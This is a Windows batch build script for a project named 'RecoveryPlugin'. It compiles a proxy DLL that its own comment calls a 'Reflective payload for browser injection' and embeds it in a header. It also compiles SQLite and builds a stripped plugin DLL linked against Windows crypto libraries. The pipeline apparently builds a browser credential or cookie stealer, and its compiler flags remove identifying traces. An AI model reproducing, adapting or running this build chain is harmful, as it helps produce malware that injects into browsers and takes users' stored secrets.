@echo off
setlocal enabledelayedexpansion

:: Configuration
set OUTPUT_DIR=build
set PROXY_DLL=proxydll.cpp
set MAIN_CPP=main.cpp
set SQLITE_C=sqlite3.c
set BIN2HEADER=bin2header.py
set PAYLOAD_HEADER=proxydll_payload.h

:: Create build directory
if not exist %OUTPUT_DIR% mkdir %OUTPUT_DIR%

echo [+] ========================================================
echo [+] Building RecoveryPlugin Project
echo [+] ========================================================

:: 1. Build the ProxyDLL (Reflective payload for browser injection)
echo [+] 1/4: Compiling ProxyDLL...
g++ -O3 -shared %PROXY_DLL% -o %OUTPUT_DIR%\proxydll.dll ^
    -lws2_32 -lcrypt32 -lshlwapi -lole32 -loleaut32 -lbcrypt ^
    -static -static-libgcc -static-libstdc++ ^
    -s -fno-ident -fno-asynchronous-unwind-tables
if %ERRORLEVEL% NEQ 0 (
    echo [-] Error: Failed to compile ProxyDLL!
    exit /b %ERRORLEVEL%
)

:: 2. Convert DLL to Header
echo [+] 2/4: Converting ProxyDLL to header...
python %BIN2HEADER% %OUTPUT_DIR%\proxydll.dll %PAYLOAD_HEADER%
if %ERRORLEVEL% NEQ 0 (
    echo [-] Error: Failed to convert ProxyDLL to header!
    exit /b %ERRORLEVEL%
)

:: 3. Build SQLite3
echo [+] 3/4: Compiling SQLite3 (C source)...
gcc -O3 -c %SQLITE_C% -o %OUTPUT_DIR%\sqlite3.o ^
    -DSQLITE_THREADSAFE=0 -DSQLITE_OMIT_LOAD_EXTENSION -DSQLITE_OMIT_DEPRECATED
if %ERRORLEVEL% NEQ 0 (
    echo [-] Error: Failed to compile SQLite3!
    exit /b %ERRORLEVEL%
)

:: 4. Build the Main Plugin DLL
echo [+] 4/4: Compiling RecoveryPlugin DLL...
g++ -O3 -shared %MAIN_CPP% %OUTPUT_DIR%\sqlite3.o -o %OUTPUT_DIR%\RecoveryPlugin.dll ^
    -lws2_32 -lcrypt32 -lbcrypt -lshlwapi -lole32 -loleaut32 ^
    -static -static-libgcc -static-libstdc++ ^
    -s -fno-ident -fno-asynchronous-unwind-tables
if %ERRORLEVEL% NEQ 0 (
    echo [-] Error: Failed to compile RecoveryPlugin!
    exit /b %ERRORLEVEL%
)

echo [+] ========================================================
echo [!] BUILD SUCCESSFUL: %OUTPUT_DIR%\RecoveryPlugin.dll
echo [+] ========================================================
pause
